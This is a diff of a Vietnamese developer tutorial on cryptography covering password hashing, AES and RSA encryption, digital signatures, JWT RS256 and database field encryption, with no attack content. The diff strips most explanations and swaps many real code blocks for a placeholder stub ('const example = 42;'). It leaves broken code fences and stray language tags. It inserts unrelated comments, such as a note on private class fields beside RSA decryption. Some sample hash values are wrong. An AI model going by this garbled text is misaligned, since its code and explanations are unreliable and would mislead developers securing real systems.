-| **Algorithms**     | bcrypt, SHA-256, MD5 (legacy) | AES, RSA, ChaCha20                  | RSA, ECDSA, EdDSA                       |
-| **Performance**    | Slow (bcrypt: 10 rounds)      | Fast (AES: hardware accelerated)    | Medium (RSA slower than ECDSA)          |
-
----
-
-#### **🔍 Cơ Chế Hoạt Động Chi Tiết**
-
-Trước khi đi vào code, hãy hiểu rõ **CƠ CHẾ** hoạt động của từng loại để biết **KHI NÀO** dùng **CÁI GÌ**.
-
----
-
-#### **🔐 A. HASHING - Hàm Băm Một Chiều**
-
-**📌 Cơ Chế Hoạt Động:**
-
-```
 INPUT (bất kỳ độ dài) → HASH FUNCTION → OUTPUT (fixed length)
 
 "password123"     →  bcrypt  →  "$2b$10$N9qo8uLO..."  (60 chars)
 "myfile.pdf"      →  SHA-256 →  "e3b0c44298fc1c..." (64 hex chars)
 "Hello World"     →  SHA-256 →  "a591a6d40bf420..." (64 hex chars)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔑 Đặc Điểm Quan Trọng:**
-
-1. **One-Way (Một chiều)**:
-
-   - ✅ Có thể: Password → Hash
-   - ❌ KHÔNG thể: Hash → Password
-   - Lý do: Hash function loại bỏ thông tin (many-to-one mapping)
-
-2. **Deterministic (Cố định)**:
-
-   ```typescript
+typescript
    hash('password123') === hash('password123'); // ✅ Luôn giống nhau
-   ```
 
-3. **Avalanche Effect (Hiệu ứng tuyết lở)**:
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    hash("password123")  → "e3b0c44298fc1c..."
    hash("password124")  → "92cf3b8ec0a8d7..."  // Hoàn toàn khác!
    // Chỉ thay đổi 1 ký tự → hash hoàn toàn khác
-   ```
 
-4. **Fixed Output Length (Độ dài cố định)**:
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    hash("Hi")           → 64 hex chars (SHA-256)
    hash("Very long...") → 64 hex chars (SHA-256)
    // Input bất kỳ → output luôn 64 chars
-   ```
 
-**🎯 Tại Sao Dùng cho Passwords?**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-```typescript
+typescript
 // ❌ VẤN ĐỀ: Lưu plaintext password
 Database: { email: "user@example.com", password: "mypassword123" }
 // Nếu hacker hack database → biết ngay password!
@@ -24008,11 +15622,13 @@ const storedHash = "$2b$10$N9qo8uLO...";
 
 // So sánh: hash(userInput) === storedHash?
 const isValid = bcrypt.compare(userInput, storedHash);  // ✅ true nếu đúng
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Salt - Ngăn Rainbow Table Attack:**
-
-```typescript
+typescript
 // ❌ KHÔNG DÙNG SALT:
 hash("password123") → "e3b0c44298fc1c..."  // Luôn giống nhau
 // Hacker tạo Rainbow Table (bảng hash sẵn của triệu passwords phổ biến)
@@ -24023,38 +15639,25 @@ hash("password123" + "randomSalt1") → "$2b$10$abc..."
 hash("password123" + "randomSalt2") → "$2b$10$xyz..."
 // Mỗi user có salt khác nhau → cùng password cũng khác hash
 // Rainbow Table KHÔNG dùng được! (vì phải tạo bảng cho mỗi salt)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🔐 B. ENCRYPTION - Mã Hóa Hai Chiều**
-
-Có 2 loại: **Symmetric** (Đối xứng) và **Asymmetric** (Bất đối xứng).
-
----
-
-#### **🔐 B.1. SYMMETRIC ENCRYPTION - Mã Hóa Đối Xứng (1 Key)**
-
-**📌 Cơ Chế Hoạt Động:**
-
-```
 PLAINTEXT + KEY → [ENCRYPT] → CIPHERTEXT
 CIPHERTEXT + KEY → [DECRYPT] → PLAINTEXT
 
 Ví dụ:
 "Hello World" + key123 → [AES Encrypt] → "6Kq8z3Xp..."
 "6Kq8z3Xp..." + key123 → [AES Decrypt] → "Hello World"
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔑 Đặc Điểm:**
-
-- **1 key duy nhất**: Dùng cho cả encrypt VÀ decrypt
-- **Fast**: AES-256 rất nhanh (hardware accelerated)
-- **Problem**: Làm sao gửi key an toàn cho receiver?
-
-**🎯 Ví Dụ Thực Tế - Alice gửi message cho Bob:**
-
-```typescript
+typescript
  // Chú giải: ALICE (Sender):
 const message = 'Meet me at 3pm';
 const secretKey = 'shared-secret-key-123'; // ⚠️ Alice và Bob đều biết key này
@@ -24068,60 +15671,48 @@ const secretKey = 'shared-secret-key-123'; // ⚠️ Bob phải có CÙNG key
 
 const decrypted = AES.decrypt(received, secretKey); // Chú giải: "Meet me at 3pm"
 console.log(decrypted); // ✅ Bob đọc được message
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ VẤN ĐỀ: Key Distribution Problem**
-
-```
 Alice và Bob cách nhau 1000km, làm sao chia sẻ secretKey an toàn?
 - Gửi qua email? ❌ Email có thể bị intercept
 - Gửi qua SMS? ❌ SMS không mã hóa
 - Nói điện thoại? ❌ Điện thoại có thể bị nghe lén
 
 → Giải pháp: Dùng ASYMMETRIC ENCRYPTION để trao đổi symmetric key!
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Use Cases:**
-
-- **Database Encryption**: Encrypt PII (email, phone, SSN)
-- **File Encryption**: Encrypt files trước khi upload cloud
-- **HTTPS Data**: Sau khi handshake, dùng AES encrypt data
-- **Disk Encryption**: BitLocker, FileVault dùng AES
-
-**💡 Tại Sao HTTPS Dùng AES (Không Dùng RSA)?**
-
-```
 AES-256:  Encrypt 1GB file trong ~1 giây
 RSA-2048: Encrypt 1GB file trong ~10 phút!
 
 → HTTPS flow:
 1. Handshake: Dùng RSA trao đổi AES key (chỉ ~32 bytes)
 2. Data Transfer: Dùng AES encrypt data (nhanh!)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🔐 B.2. ASYMMETRIC ENCRYPTION - Mã Hóa Bất Đối Xứng (2 Keys)**
-
-**📌 Cơ Chế Hoạt Động:**
-
-```
 2 KEYS: Public Key (công khai) + Private Key (bí mật)
 
 ENCRYPT với PUBLIC KEY → Decrypt với PRIVATE KEY
 PLAINTEXT + Public Key  → [ENCRYPT] → CIPHERTEXT
 CIPHERTEXT + Private Key → [DECRYPT] → PLAINTEXT
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔑 Đặc Điểm:**
-
-- **2 keys khác nhau**: Public (share freely) + Private (keep secret)
-- **Math Magic**: Dựa trên số học (factorization, discrete logarithm)
-- **Slow**: RSA chậm hơn AES 10-100x
-
-**🎯 Ví Dụ Thực Tế - Alice gửi message cho Bob:**
-
-```typescript
+typescript
  // Chú giải: BOB tạo key pair:
 const bobKeys = generateRSAKeyPair();
  // Chú giải: bobKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share freely)
@@ -24141,11 +15732,12 @@ const encrypted = RSA.encrypt(message, bobKeys.publicKey); // Dùng Bob's PUBLIC
  // Chú giải: BOB (Receiver):
 const decrypted = RSA.decrypt(encrypted, bobKeys.privateKey); // Dùng Bob's PRIVATE KEY
 console.log(decrypted); // Chú giải: "Meet me at 3pm" ✅
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Giải Quyết Key Distribution Problem:**
-
-```
 Alice muốn gửi message cho Bob:
 
 CÁCH CŨ (Symmetric):
@@ -24163,18 +15755,13 @@ CÁCH MỚI (Asymmetric):
 ✅ KHÔNG cần gặp nhau!
 ✅ KHÔNG cần trao đổi secret key!
 ✅ Public key bị lộ cũng KHÔNG sao!
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Use Cases:**
-
-- **HTTPS Handshake**: Server gửi public key, client encrypt AES key
-- **SSH Authentication**: Client có private key, server có public key
-- **PGP Email**: Encrypt email với recipient's public key
-- **Digital Signatures**: Sign với private key, verify với public key (đảo ngược!)
-
-**🔐 Public Key vs Private Key - Ai Dùng Cái Gì?**
-
-```typescript
+typescript
 // ENCRYPTION (Mã hóa - Protect Confidentiality):
 Sender   encrypt với RECEIVER's PUBLIC KEY
 Receiver decrypt với RECEIVER's PRIVATE KEY
@@ -24190,15 +15777,12 @@ Verifier verify với SIGNER's PUBLIC KEY
 Ví dụ: Alice ký document
 Alice:  sign(document, Alice's PRIVATE KEY)   → signature
 Bob:    verify(document, signature, Alice's PUBLIC KEY) → ✅ valid
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🔐 C. DIGITAL SIGNATURE - Chữ Ký Số**
-
-**📌 Cơ Chế Hoạt Động:**
-
-```
 SIGN (Ký):
 1. Hash document với SHA-256 → hash
 2. Encrypt hash với PRIVATE KEY → signature
@@ -24208,19 +15792,15 @@ VERIFY (Xác thực):
 1. Hash received document → hash1
 2. Decrypt signature với PUBLIC KEY → hash2
 3. Compare hash1 === hash2 ?
-   - ✅ Match → Document valid, không bị tamper
-   - ❌ Not match → Document bị thay đổi hoặc signature giả
+- ✅ Match → Document valid, không bị tamper
+- ❌ Not match → Document bị thay đổi hoặc signature giả
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔑 Đặc Điểm:**
-
-- **Prove Authenticity**: Chứng minh document từ đúng người (chỉ họ có private key)
-- **Prove Integrity**: Chứng minh document không bị thay đổi (hash khớp)
-- **Non-repudiation**: Signer không thể chối bỏ đã ký (vì chỉ họ có private key)
-
-**🎯 Ví Dụ Thực Tế - Alice Ký Contract:**
-
-```typescript
+typescript
  // Chú giải: ALICE tạo key pair:
 const aliceKeys = generateRSAKeyPair();
  // Chú giải: aliceKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share)
@@ -24257,11 +15837,12 @@ if (hash1 === hash2) {
   console.log('❌ Signature invalid!');
   console.log('❌ Contract bị tamper hoặc signature giả!');
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Tại Sao KHÔNG Encrypt Toàn Bộ Document?**
-
-```
 RSA SLOW:
 - Sign toàn bộ contract (10 pages) → 10 giây
 - Sign hash của contract (64 chars)  → 0.01 giây
@@ -24270,19 +15851,13 @@ Hash UNIQUE:
 - 2 documents khác nhau → 2 hashes khác nhau
 - 1 document thay đổi 1 ký tự → hash hoàn toàn khác
 → Verify hash = verify toàn bộ document!
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Use Cases:**
-
-- **JWT Tokens**: Server sign JWT với private key, client verify với public key
-- **Code Signing**: Software developers sign apps (macOS, Windows)
-- **SSL Certificates**: Certificate Authority (CA) sign certificates
-- **Blockchain**: Sign transactions với private key
-- **Email (PGP)**: Sign emails để prove authenticity
-
-**🔐 Digital Signature vs Encryption - Khác Nhau Thế Nào?**
-
-```typescript
+typescript
 // ENCRYPTION (Mã hóa):
 Mục đích: Protect CONFIDENTIALITY (bảo mật)
 Encrypt với: RECEIVER's PUBLIC KEY
@@ -24302,11 +15877,13 @@ Result: Mọi người verify được message từ signer
 Ví dụ: Alice ký contract
 Alice:  sign(contract, Alice's PRIVATE)   → Bob verify với Alice's PUBLIC
         ↑ Dùng Alice's keys!
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 JWT Example - Kết Hợp Cả Hai:**
-
-```typescript
+typescript
  // Chú giải: SERVER (Sign JWT):
 const payload = { userId: '123', role: 'admin' };
 const privateKey = '-----BEGIN PRIVATE KEY-----...';
@@ -24327,11 +15904,13 @@ try {
   console.log('❌ Token invalid:', error.message);
   // ❌ Token bị tamper hoặc signature giả
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Tại Sao JWT Dùng RS256 (Không Dùng HS256)?**
-
-```typescript
+typescript
  // Chú giải: HS256 (HMAC with SHA-256):
 - Symmetric: 1 secret key (server giữ)
 - Sign: HMAC(payload, secret)
@@ -24346,42 +15925,13 @@ try {
 ✅ Client verify được (có public key)
 ✅ Client KHÔNG thể forge tokens (không có private key)
 ✅ Microservices verify được (share public key)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 Tóm Tắt Cơ Chế:**
-
-| Loại                   | Keys              | Operation                     | Use Case                        |
-| ---------------------- | ----------------- | ----------------------------- | ------------------------------- |
-| **Hashing**            | ❌ No key         | Input → Hash (one-way)        | Passwords, checksums            |
-| **Symmetric Encrypt**  | 1 key (shared)    | Encrypt/Decrypt (same key)    | Database encryption, HTTPS data |
-| **Asymmetric Encrypt** | 2 keys (pub+priv) | Encrypt (pub), Decrypt (priv) | HTTPS handshake, PGP email      |
-| **Digital Signature**  | 2 keys (pub+priv) | Sign (priv), Verify (pub)     | JWT, code signing, blockchain   |
-
----
-
-#### **1️⃣ HASHING - One-Way Function (Hàm Một Chiều)**
-
-**🔑 Đặc Điểm:**
-
-- **One-way**: Input → Hash, KHÔNG thể Hash → Input
-- **Deterministic**: Cùng input → cùng hash
-- **Fixed length**: SHA-256 luôn 64 hex chars (256 bits)
-- **Avalanche effect**: Thay đổi 1 bit input → hoàn toàn khác hash
-
-**📌 Use Cases:**
-
-1. **Password Storage**: Never store plaintext passwords
-2. **Data Integrity**: Verify files không bị thay đổi (checksums)
-3. **Unique Identifiers**: Generate tokens, session IDs
-4. **Blockchain**: Bitcoin sử dụng SHA-256
-
----
-
-**🔐 1.1. Password Hashing với bcrypt**
-
-```typescript
+typescript
 import bcrypt from 'bcrypt';
 
  // Chú giải: =====================================
@@ -24452,25 +16002,13 @@ async function changePassword(
     passwordChangedAt: new Date(),
   });
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Giải Thích:**
-
-- **bcrypt format**: `$2b$10$salt(22 chars)hash(31 chars)` (total 60 chars)
-  - `$2b$` = bcrypt algorithm version
-  - `10` = salt rounds (cost factor)
-  - `salt` = random salt (22 chars)
-  - `hash` = actual hash (31 chars)
-- **Salt**: Random value thêm vào password trước khi hash
-  - Mục đích: Ngăn rainbow table attacks
-  - Mỗi user có salt khác nhau → cùng password cũng khác hash
-- **bcrypt.compare()**: Tự động extract salt từ hash và compare
-
----
-
-**🔐 1.2. Data Integrity với SHA-256**
-
-```typescript
+typescript
 import crypto from 'crypto';
 
  // Chú giải: =====================================
@@ -24524,40 +16062,13 @@ function verifyWebhook(
     Buffer.from(expectedSignature)
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Giải Thích:**
-
-- **SHA-256**: Cryptographic hash function (256-bit output)
-  - Không dùng cho password (quá nhanh → vulnerable to brute-force)
-  - Dùng cho checksums, data integrity
-- **HMAC** (Hash-based Message Authentication Code):
-  - SHA-256 + secret key
-  - Verify cả integrity VÀ authenticity
-  - Dùng trong webhook signatures, API authentication
-
----
-
-#### **2️⃣ ENCRYPTION - Two-Way Function (Mã Hóa Hai Chiều)**
-
-> **� Xem lại phần [🔐 B. ENCRYPTION](#-b-encryption---mã-hóa-hai-chiều) ở trên để hiểu rõ cơ chế hoạt động của Symmetric (1 key) vs Asymmetric (2 keys), Public/Private Key, và Key Distribution Problem!**
-
-**�🔑 Đặc Điểm:**
-
-- **Two-way**: Plaintext ⇄ Ciphertext (encrypt ↔ decrypt)
-- **Requires key**: Symmetric (1 key) hoặc Asymmetric (2 keys)
-- **Protects confidentiality**: Giấu dữ liệu khỏi unauthorized access
-
-**📌 Use Cases:**
-
-1. **HTTPS/TLS**: Encrypt network traffic
-2. **Database Encryption**: Protect sensitive PII (emails, phone numbers)
-3. **File Encryption**: Encrypt files trước khi upload cloud
-4. **API Keys**: Encrypt secrets trong config
-
-**🔍 Nhắc Lại Cơ Chế:**
-
-```typescript
+typescript
  // Chú giải: SYMMETRIC (AES): 1 key cho cả encrypt & decrypt
 const key = 'shared-secret-key';
 const encrypted = AES.encrypt('data', key); // Chú giải: Encrypt với key
@@ -24569,13 +16080,13 @@ const { publicKey, privateKey } = generateKeys();
 const encrypted = RSA.encrypt('data', publicKey); // Chú giải: Encrypt với PUBLIC key
 const decrypted = RSA.decrypt(encrypted, privateKey); // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
 // ✅ Giải pháp: Public key share thoải mái, chỉ private key giữ bí mật!
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**🔐 2.1. Symmetric Encryption - AES (Advanced Encryption Standard)**
-
-```typescript
+typescript
 import crypto from 'crypto';
 
  // Chú giải: =====================================
@@ -24668,28 +16179,13 @@ async function getUser(userId: string, encryptionKey: string): Promise<User> {
     ssn: decryptAES(encryptedSSN, encryptionKey),
   };
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Giải Thích:**
-
-- **AES-256-GCM**:
-  - AES = Advanced Encryption Standard (industry standard)
-  - 256 = key length (256 bits = 32 bytes)
-  - GCM = Galois/Counter Mode (authenticated encryption)
-    - Vừa encrypt VỪA authenticate (detect tampering)
-- **IV (Initialization Vector)**:
-  - Random 12 bytes cho GCM mode
-  - PHẢI unique mỗi lần encrypt
-  - Không cần secret (lưu cùng ciphertext)
-- **Auth Tag**:
-  - 16 bytes tag verify integrity
-  - Nếu data bị modify → decrypt throw error
-
----
-
-**🔐 2.2. Asymmetric Encryption - RSA (Public/Private Key)**
-
-```typescript
+typescript
 import crypto from 'crypto';
 
  // Chú giải: =====================================
@@ -24759,46 +16255,13 @@ const decryptedMessage = decryptRSA(encryptedMessage, bob.privateKey); // Dùng 
 console.log('Decrypted:', decryptedMessage); // Chú giải: "Secret meeting at 3pm"
 
 // ⚠️ Alice KHÔNG thể decrypt (không có Bob's private key)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Giải Thích:**
-
-- **RSA Asymmetric**:
-  - Public key: Share freely, dùng để ENCRYPT
-  - Private key: Keep secret, dùng để DECRYPT
-  - Math: Easy encrypt, hard decrypt without private key (based on factorization)
-- **Use Cases**:
-  - HTTPS/TLS handshake (exchange symmetric keys)
-  - PGP email encryption
-  - SSH authentication
-- **Limitations**:
-  - Slow (10-100x slower than AES)
-  - Size limit (RSA-2048 max ~245 bytes plaintext)
-  - → Thường dùng để encrypt symmetric key, rồi dùng AES cho data
-
----
-
-#### **3️⃣ DIGITAL SIGNATURES - Sign & Verify (Chữ Ký Số)**
-
-> **💡 Xem lại phần [🔐 C. DIGITAL SIGNATURE](#-c-digital-signature---chữ-ký-số) ở trên để hiểu rõ cơ chế: Sign với Private Key (chỉ signer có), Verify với Public Key (ai cũng verify được), và tại sao dùng cho JWT RS256!**
-
-**🔑 Đặc Điểm:**
-
-- **Sign với private key**: Chỉ owner có thể sign
-- **Verify với public key**: Anyone có thể verify
-- **Proves authenticity**: Message từ đúng người (chỉ họ có private key)
-- **Proves integrity**: Message không bị thay đổi (hash khớp)
-
-**📌 Use Cases:**
-
-1. **JWT Tokens**: Sign payload với RS256
-2. **API Authentication**: Verify requests từ trusted clients
-3. **Code Signing**: Verify software không bị tamper
-4. **Blockchain**: Sign transactions
-
-**🔍 Nhắc Lại Cơ Chế:**
-
-```typescript
+typescript
 // DIGITAL SIGNATURE: Đảo ngược Encryption!
 
  // Chú giải: ENCRYPTION (Bảo mật):
@@ -24820,13 +16283,13 @@ const signature = RSA.encrypt(hash, privateKey); // Trường private (ví dụ 
 const hash1 = SHA256(document);
 const hash2 = RSA.decrypt(signature, publicKey); // Chú giải: Verify = Decrypt với PUBLIC key
 if (hash1 === hash2) console.log("✅ Valid signature!");
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**🔐 3.1. JWT Digital Signature với RS256**
-
-```typescript
+typescript
 import jwt from 'jsonwebtoken';
 import crypto from 'crypto';
 
@@ -24936,30 +16399,13 @@ const payload = {
  // Chú giải: 2. Compute signature với public key
  // Chú giải: 3. Compare với signature trong JWT
 // 4. Nếu match → valid, không match → tampered
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Giải Thích:**
-
-- **RS256** (RSA + SHA-256):
-  - Sign với private key → chỉ server mới sign được
-  - Verify với public key → client/services verify được
-  - SHA-256: Hash algorithm để sign
-- **JWT Flow**:
-  1. Server sign payload với private key
-  2. Client lưu token (localStorage/cookie)
-  3. Client gửi token trong Authorization header
-  4. Server verify token với public key
-  5. Nếu valid → allow access
-- **Security**:
-  - Private key PHẢI keep secret (trên server)
-  - Public key có thể share (cho clients verify)
-  - Nếu private key leak → attacker có thể forge tokens!
-
----
-
-**🔐 3.2. Manual RSA Signature (Low-Level)**
-
-```typescript
+typescript
 import crypto from 'crypto';
 
  // Chú giải: =====================================
@@ -25067,44 +16513,13 @@ console.log('Signature:', signature);
  // Chú giải: Server verifies
 const isValid = verifyAPIRequest(request, signature, publicKey);
 console.log('Valid?', isValid); // Chú giải: true
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Giải Thích:**
-
-- **Digital Signature Process**:
-  1. Hash data với SHA-256
-  2. Encrypt hash với private key → signature
-  3. Gửi data + signature
-  4. Receiver hash data
-  5. Decrypt signature với public key
-  6. Compare hashes → nếu match = valid
-- **Security Benefits**:
-  - **Authenticity**: Chỉ owner của private key mới sign được
-  - **Integrity**: Nếu data thay đổi → hash khác → verify fail
-  - **Non-repudiation**: Signer không thể deny đã sign
-
----
-
-#### **📚 Khi Nào Dùng Gì?**
-
-| Scenario                       | Solution                        | Reason                                |
-| ------------------------------ | ------------------------------- | ------------------------------------- |
-| **Store passwords**            | bcrypt Hashing                  | One-way, slow (prevent brute-force)   |
-| **Verify file integrity**      | SHA-256 Checksum                | Fast, detect corruption/tampering     |
-| **Encrypt database PII**       | AES-256-GCM                     | Symmetric, fast, authenticated        |
-| **HTTPS/TLS**                  | RSA (key exchange) + AES (data) | RSA slow → dùng cho key, AES cho data |
-| **JWT authentication**         | RS256 Digital Signature         | Public verify, private sign           |
-| **API request authentication** | HMAC or RSA Signature           | Verify request từ trusted client      |
-| **Webhook verification**       | HMAC-SHA256                     | Shared secret, fast                   |
-| **Email encryption (PGP)**     | RSA + AES                       | RSA cho key exchange, AES cho message |
-
----
-
-#### **🗄️ DATABASE ENCRYPTION - Mã Hóa Database**
-
-**📌 3 Chiến Lược:**
-
-````
+`
 1. Field-Level (App-Level) ⭐ RECOMMENDED
    → App encrypt trước khi lưu DB
    → Encrypt chỉ sensitive fields
@@ -25122,315 +16537,74 @@ console.log('Valid?', isValid); // Chú giải: true
 
 **🔐 Implementation - Encryption Service**
 
-```typescript
-import crypto from 'crypto';
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-class FieldEncryptionService {
-  private key = Buffer.from(process.env.DB_ENCRYPTION_KEY!, 'hex'); // Chú giải: 32 bytes
-
-  encrypt(plaintext: string): string {
-    const iv = crypto.randomBytes(12); // Chú giải: Random IV mỗi lần
-    const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);
-
-    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
-    encrypted += cipher.final('hex');
-
-    const authTag = cipher.getAuthTag();
-
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return). Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
-    return JSON.stringify({
-      iv: iv.toString('hex'),
-      data: encrypted,
-      tag: authTag.toString('hex')
-    });
-  }
-
-  decrypt(encryptedString: string): string {
-    const { iv, data, tag } = JSON.parse(encryptedString);
-
-    const decipher = crypto.createDecipheriv(
-      'aes-256-gcm',
-      this.key,
-      Buffer.from(iv, 'hex')
-    );
-
-    decipher.setAuthTag(Buffer.from(tag, 'hex'));
-
-    let decrypted = decipher.update(data, 'hex', 'utf8');
-    decrypted += decipher.final('utf8');
-
-    return decrypted;
-  }
-}
-
-const encryptionService = new FieldEncryptionService();
-````
+`
 
 ---
 
 **🔐 User Service - Real Example**
 
-```typescript
-interface User {
-  email: string; // Chú giải: Plaintext (need to search)
-  password: string; // Chú giải: Hashed (bcrypt)
-  phone: string; // Chú giải: ENCRYPTED (PII)
-  ssn: string; // Chú giải: ENCRYPTED (very sensitive)
-  role: string; // Chú giải: Plaintext
-}
-
-class UserService {
-  /**
-   * CREATE - Encrypt before save
-   */
-  async createUser(data: UserDTO) {
-    const user = {
-      email: data.email, // Chú giải: Plaintext
-      password: await bcrypt.hash(data.password, 10), // Chú giải: Hash
-      phone: encryptionService.encrypt(data.phone), // Chú giải: Encrypt
-      ssn: encryptionService.encrypt(data.ssn), // Chú giải: Encrypt
-      role: data.role,
-    };
-
-    return await db.users.create(user);
-  }
-
-  /**
-   * READ - Decrypt after fetch
-   */
-  async getUser(userId: string) {
-    const dbUser = await db.users.findById(userId);
-
-    return {
-      ...dbUser,
-      phone: encryptionService.decrypt(dbUser.phone), // Chú giải: Decrypt
-      ssn: encryptionService.decrypt(dbUser.ssn), // Chú giải: Decrypt
-    };
-  }
-
-  /**
-   * SEARCH by email (plaintext field)
-   */
-  async findByEmail(email: string) {
-    return await db.users.findOne({ email }); // Chú giải: ✅ Works
-  }
-
-  /**
-   * ⚠️ SEARCH by phone (encrypted field)
-   */
-  async findByPhone(phone: string) {
-    // ❌ KHÔNG thể: db.users.findOne({ phone })
- // Chú giải: Phone is encrypted in DB!
-
- // Chú giải: ✅ Solution: Hash index
-    const phoneHash = crypto.createHash('sha256').update(phone).digest('hex');
-    return await db.users.findOne({ phoneHash });
-  }
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **🔐 Database Schema**
 
-```sql
-CREATE TABLE users (
-  id UUID PRIMARY KEY,
-
-  -- Plaintext (searchable)
-  email VARCHAR(255) UNIQUE NOT NULL,
-  role VARCHAR(50) NOT NULL,
-
-  -- Hashed (bcrypt)
-  password VARCHAR(255) NOT NULL,
-
-  -- Encrypted (AES-256-GCM JSON string)
-  phone TEXT NOT NULL,
-  ssn TEXT NOT NULL,
-
-  -- Hash indexes (for searching encrypted fields)
-  phone_hash VARCHAR(64),  -- SHA-256 of phone
-  ssn_hash VARCHAR(64),    -- SHA-256 of SSN
-
-  INDEX idx_email (email),
-  INDEX idx_phone_hash (phone_hash)
-);
-
--- Example row:
--- email: "user@email.com"
--- password: "$2b$10$abc..."
--- phone: "{\"iv\":\"f3a2\",\"data\":\"8k2p\",\"tag\":\"m9x1\"}"
--- phone_hash: "e3b0c44298fc1c..."
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **🔑 Key Management**
 
-```typescript
- // Chú giải: ❌ BAD: Hardcode key
-const KEY = 'my-secret-key-12345678901234567890';
-
- // Chú giải: ⚠️ OK: Environment variable (dev only)
-const KEY = process.env.DB_ENCRYPTION_KEY;
-
- // Chú giải: ✅ GOOD: AWS KMS / Azure Key Vault
-import { KMSClient, DecryptCommand } from '@aws-sdk/client-kms';
-
-class KMSService {
-  async getKey(): Promise<Buffer> {
-    const kms = new KMSClient({ region: 'us-east-1' });
-    const command = new DecryptCommand({
-      KeyId: process.env.KMS_KEY_ID,
-      CiphertextBlob: Buffer.from(process.env.ENCRYPTED_KEY!, 'base64'),
-    });
-
-    const response = await kms.send(command);
-    return Buffer.from(response.Plaintext!);
-  }
-}
-
- // Chú giải: ✅ BEST: Envelope Encryption
- // Chú giải: - Master Key (KMS): Encrypt/decrypt Data Encryption Keys
- // Chú giải: - Data Encryption Key (DEK): Encrypt actual data
- // Chú giải: - Master key never leaves KMS
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **🔍 Searchable Encryption Pattern**
 
-```typescript
-class SearchableEncryption {
-  /**
-   * Save with hash index
-   */
-  async saveUser(data: UserDTO) {
-    const phoneHash = crypto
-      .createHash('sha256')
-      .update(data.phone)
-      .digest('hex');
-
-    await db.users.create({
-      email: data.email,
-      phone: encryptionService.encrypt(data.phone), // Chú giải: Encrypted
-      phoneHash, // Chú giải: Hash for search
-    });
-  }
-
-  /**
-   * Search by hash
-   */
-  async findByPhone(phone: string) {
-    const hash = crypto.createHash('sha256').update(phone).digest('hex');
-    const user = await db.users.findOne({ phoneHash: hash });
-
-    if (!user) return null;
-
-    return {
-      ...user,
-      phone: encryptionService.decrypt(user.phone), // Chú giải: Decrypt result
-    };
-  }
-}
-
-/**
- * ⚠️ Limitations:
- * - ✅ Exact match: phone = "+1234567890"
- * - ❌ Partial match: phone LIKE "%567%"
- * - ❌ Range query: phone > "1000"
- */
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **🔄 Key Rotation**
 
-```typescript
-class KeyRotation {
-  /**
-   * Rotate encryption key
-   */
-  async rotateKey() {
- // Chú giải: 1. Generate new key
-    const newKey = crypto.randomBytes(32);
-
- // Chú giải: 2. Keep old key (for decryption)
-    const oldKey = this.getCurrentKey();
-
- // Chú giải: 3. Re-encrypt all data (background job)
-    const users = await db.users.findAll();
-    for (const user of users) {
-      const decrypted = this.decryptWithOldKey(user.phone, oldKey);
-      const reencrypted = this.encryptWithNewKey(decrypted, newKey);
-      await db.users.update(user.id, { phone: reencrypted });
-    }
-
- // Chú giải: 4. Delete old key after all data re-encrypted
-  }
-}
-
-/**
- * Best Practice:
- * - Rotate every 90 days (compliance)
- * - Version keys: { version: 2, data: "..." }
- * - Keep old keys for 30 days (grace period)
- */
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **✅ Best Practices**
 
-```typescript
- // Chú giải: What to encrypt?
-✅ Phone numbers, SSN, addresses
-✅ Credit card numbers
-✅ Medical records
-✅ Financial data
-
- // Chú giải: What NOT to encrypt?
-❌ Passwords → Use hashing (bcrypt)
-❌ Email → Need for search/login
-❌ Username, role → Not sensitive
-
- // Chú giải: Key Management
